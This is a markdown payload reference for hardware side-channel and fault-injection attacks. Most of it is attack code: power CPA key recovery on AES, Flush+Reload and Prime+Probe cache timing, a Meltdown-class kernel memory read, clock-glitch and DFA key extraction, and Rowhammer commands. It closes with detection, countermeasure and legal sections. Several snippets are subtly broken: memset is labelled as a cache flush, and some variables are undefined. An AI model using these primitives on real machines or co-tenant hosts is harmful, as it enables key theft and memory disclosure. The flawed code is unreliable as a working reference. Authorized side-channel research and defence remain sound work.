# Payloads — hardware-side-channel-advanced

> Attack payloads for hardware-side-channel-advanced.
> Scope: power/EM analysis, cache and transient-execution (microarchitectural) leaks, and fault injection against classical crypto implementations and CPUs. Lattice/PQC-specific side channels (single-trace ML-KEM attacks) live in `pqc-implementation-attack`.
> All lab sections assume owned hardware (ChipWhisperer-class setup) or authorized lab access.

---

## Index

1. [Lab Foundation](#1-lab-foundation)
2. [Power Analysis — SPA / CPA (full workflow)](#2-power-analysis--spa--cpa-full-workflow)
3. [Template Attacks](#3-template-attacks)
4. [RSA CRT Timing Leak](#4-rsa-crt-timing-leak)
5. [EM Side-Channel — Near-Field Capture & EM DPA](#5-em-side-channel--near-field-capture--em-dpa)
6. [Cache Timing — Prime+Probe / Flush+Reload](#6-cache-timing--primeprobe--flushreload)
7. [Transient Execution — Meltdown/MDS/LVI, SGX Attacks](#7-transient-execution--meltdownmdslvi-sgx-attacks)
8. [Fault Injection — Clock Glitch, Laser DFA, Rowhammer](#8-fault-injection--clock-glitch-laser-dfa-rowhammer)
9. [Known Hardware CVEs (NVD-verified)](#9-known-hardware-cves-nvd-verified)
10. [Countermeasure Assessment](#10-countermeasure-assessment)
11. [Detection Engineering](#11-detection-engineering)
12. [Reporting & Legal Boundaries](#12-reporting--legal-boundaries)

---

## 1. Lab Foundation

```bash
# Hardware baseline for this skill:
#   ChipWhisperer-Lite/Husky + STM32F4/XMEGA target (SimpleSerial AES firmware)
#   Near-field EM probe set (Langer ICS-503 class) + LNPA preamp for §5
#   Target workstations per CPU family under test for §6-§7
pip install chipwhisperer numpy scipy
# Flash the standard SimpleSerial-AES target firmware
cd chipwhisperer/hardware/victims/firmware/simpleserial-aes
make PLATFORM=CW308_STM32F4 && make PLATFORM=CW308_STM32F4 program
```

Success criteria for any lab run: full key recovery with trace count + attack time recorded — "leakage observed" is not a finding, "key recovered with N traces" is.

---

## 2. Power Analysis — SPA / CPA (full workflow)

SPA first (structure visible in a single trace), then CPA for the full key.

```python
#!/usr/bin/env python3
# cpa_full.py — complete CPA workflow against SimpleSerial AES
import chipwhisperer as cw
import numpy as np

scope, target = cw.scope(), None
scope.gain.db = 30
scope.adc.samples = 5000
scope.trigger.triggers = "tio4:rising"

project = cw.create_project("aes_traces", overwrite=True)
for i in range(5000):
    scope.arm()
    ktp = cw.ktp.Basic(); key, text = ktp.new_pair()  # fixed key per campaign
    target.simpleserial_write("p", text)
    ret = scope.capture()
    if ret: continue
    project.traces.append(scope.get_last_trace(), text, key)

from chipwhisperer.analyzer.attacks.models.AES128_8bit import AES128_8bit
attack = cw.analyzer.cpa(CPA(), AES128_8bit)
attack.set_trace_project(project)
results = attack.run()
# Report: per-subkey correlation plots, recovered key, trace count to full recovery
```

Reading SPA structure directly (no statistics): square-and-multiply exponent squences in RSA, table-lookup Hamming weights in unprotected AES — one trace, one screenshot, one finding.

---

## 3. Template Attacks

Profiling attack: build per-intermediate templates on an identical device, attack with very few traces.

```python
# lascar template workflow (sketch, see pqc-implementation-attack §4 for the PQC variant)
from lascar import Session, PlotlyOutput
# 1) Profiling set: fixed key rotation, 10k traces, label = AES SBox output byte i
# 2) Per-sample SNR -> select 256 POIs per byte
# 3) Multivariate Gaussian templates; attack: max-likelihood over 1-5 attack traces
# Success bar: full key from <=5 traces; document profiling access requirement
```

Template attacks are the strongest power-analysis result available — and the clearest demonstration that "identical hardware possession" is the real security boundary.

---

## 4. RSA CRT Timing Leak

```python
#!/usr/bin/env python3
# crt_timing.py — Montgomery/CRT branch timing on an RSA endpoint (authorized)
import subprocess, statistics, time
def measure(msg):
    t0 = time.perf_counter()
    subprocess.run(["openssl", "rsautl", "-decrypt", "-inkey", "victim.key",
                    "-in", msg], capture_output=True)  # lab: wrap target op here
    return time.perf_counter() - t0
# CRT recombination: one branch runs when c > p (half the inputs)
# Biased input messages -> sustained timing split confirms the leak
import os
samples = {b: [measure(m) for _ in range(200)] for b, m in
           [("gt", craft_gt_p()), ("lt", craft_lt_p())]}
print({b: statistics.median(v)*1e6 for b, v in samples.items()})
```

Defender-facing note: constant-time RSA libraries (OpenSSL default paths) close this — the finding is almost always in embedded/proprietary bignum code.

---

## 5. EM Side-Channel — Near-Field Capture & EM DPA

```bash
# Positioning: H-field probe over the die's crypto block (scan grid search:
# maximize correlation of a known-trigger window, not signal amplitude)
# Preamplifier + scope settings: 40-55 dB gain, 20-50 MS/s, bandpass 100kHz-1GHz sweep
```

```python
# EM DPA = §2 CPA workflow with EM traces instead of power:
# - No resistor insertion needed (non-invasive; works on finished products)
# - Spatial selectivity: probe over the AES engine isolates it from CPU noise
# - Expect 2-10x more traces than power CPA; report the multiplier
```

Non-invasive capture on finished, encased products is the engagement headline: "no modification, no decap, key recovered".

---

## 6. Cache Timing — Prime+Probe / Flush+Reload

```c
/* Flush+Reload — shared-memory (same page) target */
uint8_t probe[256 * 4096];
memset(probe, 1, sizeof(probe));                 // Flush (whole array)
victim_accesses_line();                           // victim touches array[k*4096]
for (int i = 0; i < 256; i++) {
    t0 = rdtsc_begin();
    probe[i * 4096] += 1;                         // Reload + time
    t1 = rdtsc_end();
    if (t1 - t0 < CACHE_HIT_THRESHOLD) hit(i);    // i == k
}
```

```python
#!/usr/bin/env python3
# prime_probe.py — eviction-set construction + last-level cache monitoring
import ctypes, time
# 1) Build eviction set for target LLC slice (hugepage walk, addr->set grouping)
# 2) Prime set, victim runs (AES T-table access in the watched set), Probe timings
# 3) Sustained per-set hit-pattern = AES key schedule bit leak (classic Osvik et al.)
```

Cross-VM note: Prime+Probe works across VM boundaries on shared LLC — the cloud-relevant variant; document hypervisor/colocation conditions in the finding.

---

## 7. Transient Execution — Meltdown/MDS/LVI, SGX Attacks

```bash
# Fast triage of mitigations on target (what is already patched vs reachable):
grep -r . /sys/devices/system/cpu/vulnerabilities/ | column -t
# meltdown, spectre_v1/v2, mdts, l1tf, mds, taa, srbds states per host
```

```c
/* Meltdown-class read primitive (CVE-2017-5754 family — works only on
   unpatched silicon; used to demonstrate kernel-memory disclosure in lab) */
char meltdown_read(uint64_t addr) {
    uint8_t probe[256 * 4096];
    memset(probe, 1, sizeof(probe));
    _mm_mfence();
    tmp = *(uint8_t*)addr;              // faults — but transiently executes
    probe[tmp * 4096] = 1;              // transient cache touch
    _mm_mfence();
    return flush_reload_argmax(probe);  // §6 primitive recovers tmp
}
```

```python
# MDS (CVE-2018-12126/12127/12130): sample fill-buffer/load-port data across
# cores; useful in lab to show cross-thread secret leakage on older Xeon.
# LVI (CVE-2020-0551): faulting load hijacks subsequent micro-op operand —
# demonstrate against SGX enclave code paths in lab only.
```

SGX-specific: Plundervolt (CVE-2019-11157) — voltage underscaling from outside the enclave induces faults *inside*, breaking enclave AES/integrity. SGAxe/ÆPIC-class leakage relates to APIC MMIO sampling — enumerate as finding classes for enclave assessments.

---

## 8. Fault Injection — Clock Glitch, Laser DFA, Rowhammer

```python
# Clock glitch (ChipWhisperer) — retained & hardened from original
import chipwhisperer as cw
scope = cw.scope()
scope.glitch.clk_src = 'clkgen'
scope.glitch.offset = 1000   # fine-tune per target
scope.glitch.width = 100     # glitch width
scope.glitch.ext_offset = 5  # when to glitch (clock cycles from trigger)
# Sweep offset/width grid; classify outcomes: bypass / crash / no-effect
```

```python
# DFA on AES — last-round fault model (1-byte fault -> full key from ~2 faulty ciphertexts)
# 1) Inject fault into AES round 9 (laser or EM pulse; lab: glitched clock)
# 2) Collect correct C and faulty C'
# 3) Solve Piret-Roche / Tunstall equations (phoenixAES library):
import phoenixAES
phoenixAES.crack(bytes.fromhex(C), bytes.fromhex(C_PRIME), verbose=2)
```

```bash
# Rowhammer (TRRespass methodology) — authorized targets only; DRAM-bit flips
# as fault primitive against page tables / RSA keys
git clone --depth 1 https://github.com/CMU-SAFARI/TRRespass && cd TRRespass
make && sudo ./hammerer -a double-sided -t 0x12345000 -n 100000000
# Monitor: page-table entries flipped, ECC error counters (dmesg / edac-util)
```

---

## 9. Known Hardware CVEs (NVD-verified)

All IDs verified against the NVD API on 2026-09-05 before inclusion.

| CVE | Class | Affected | Exploitation/testing note |
|-----|-------|----------|---------------------------|
| CVE-2017-5753 | Spectre v1 (bounds-check bypass) | Broad CPU population | §6 Flush+Reload gadget hunting on unharded branches |
| CVE-2017-5715 | Spectre v2 (branch-target injection) | Broad CPU population | BTB poisoning + victim probing; PoC per architecture |
| CVE-2017-5754 | Meltdown (rogue data cache load) | Pre-mitigation Intel | §7 meltdown_read primitive; triage via sysfs states |
| CVE-2018-12126 | MDS — MSBDS (store buffer) | Older Intel cores | Cross-thread sampling; lab reproduction class |
| CVE-2018-12127 | MDS — MLPDS (load port) | Older Intel cores | Same MDS family; enumerate with 12130 |
| CVE-2018-12130 | MDS — MFBDS (fill buffer) | Older Intel cores | Hyper-thread co-residency scenario headline |
| CVE-2019-11157 | Plundervolt | SGX-capable Intel | Undervolting faults inside enclaves — enclave assessment finding |
| CVE-2020-0551 | LVI (load value injection) | Speculative Intel | Faulting-load operand hijack; SGX-relevant |

Rowhammer has no consolidated CVE — report as a technique (§8) with the TRRespass methodology citation, not an ID.

---

## 10. Countermeasure Assessment

| Countermeasure | How to verify in engagement | Fail signal |
|----------------|---------------------------|------------|
| Masking (AES) | §2 CPA + 2nd-order CPA (combine 2 trace points) | 1st-order hides leak, 2nd-order recovers — quantify trace multiplier |
| Hiding (random delays/shuffling) | Trace alignment by trigger, variance analysis | Alignment-defeated attack still recovers key |
| Dual-rail / WDDL | Balanced-power verification (per-cycle Hamming symmetry) | Asymmetry under DPA after rail-imbalance tuning |
| Constant-time code | dudect on the binary's crypto path | Persistent t>5 class = leak |
| TVLA conformance | Fixed-vs-random Welch t-test, first & second order | Any persistent leak above threshold |
| Cache partitioning | §6 cross-core Prime+Probe | Observable victim pattern despite CAT/partitioning |

Deliverable: countermeasure table with trace multipliers — "masking raised recovery cost from 5k to 900k traces" is the report language executives fund.

---

## 11. Detection Engineering

```yaml
# Host: undervolting attack prerequisite (Plundervolt-class) — MSR/EC writes
title: Suspicious voltage-control interface access
logsource: { category: file_event, product: linux }
detection:
  selection:
    TargetFilename|endswith:
      - '/dev/cpu/*/msr'
      - '/sys/class/powercap/intel-rapl/*'
    Image|endswith: '/usr/bin/your-monitored-binary'
  condition: selection and not filter_whitelist
```

EDR-relevant behaviors also worth alerting: `perf_event_open` + `mlockall` pattern from unassumed binaries (SCA tooling signature), Rowhammer hammerer processes (tight single-page retry loops with `/proc/self/pagemap` reads — gated by kernel lockdown since 5.x, itself a detection point).

---

## 12. Reporting & Legal Boundaries

- Fault injection and voltage manipulation void warranties and can destroy owned hardware — sacrificial units are a line item, not an accident
- Laser/EM equipment safety rules apply (class-3B/4 lasers, lab interlocks)
- Microarchitectural testing on shared cloud hosts can leak *other tenants'* data — private bare-metal only, with the tenancy statement in the report
- Findings language: always the concrete result (key recovered / kernel byte disclosed with N samples) plus the access model it required (physical, co-tenant, remote-JS) — never the bare CVE list

---

## MITRE ATT&CK Mapping + Reference Expansion (v0.3.1)

### ATT&CK Mapping (expansion)

| ATT&CK Technique | Skill Activity | Detection Hint |
|------------------|----------------|-----------------|
| **T1041 — Exfiltration Over C2 Channel** (existing) | Leaked-key channel usage post-recovery | N/A — crypto layer |
| **T1200 — Hardware Additions** | Glitch/EM probe & crowbar rigs on targets | Physical security: unexpected bench equipment |
| **T1040 — Network Sniffing** | Cache-timing victim observation feeds | Perf-counter anomalies on victim host |
| **T1592 — Gather Victim Host Info** | CPU-family triage selects attack class | Recon-phase activity |
| **T1068 — Exploitation for Privilege Escalation** | Meltdown-class kernel disclosure | sysfs mitigation-state drift alerts |

### Reference Expansion (F-HARDW-002, v0.2.7)

- [Spectre paper and mitigations](https://spectreattack.com)
- [Meltdown paper and affected CPUs](https://meltdownattack.com)
- [IACR ePrint side-channel research](https://eprint.iacr.org)
- [CWE-203 observable discrepancy](https://cwe.mitre.org/data/definitions/203.html)
- [NIST FIPS 140-3 physical security](https://csrc.nist.gov)
- [Intel SA-AT advisories](https://www.intel.com)
- [TRRespass (Rowhammer)](https://github.com/CMU-SAFARI/TRRespass)
- [dudect constant-time checker](https://github.com/oreparaz/dudect)
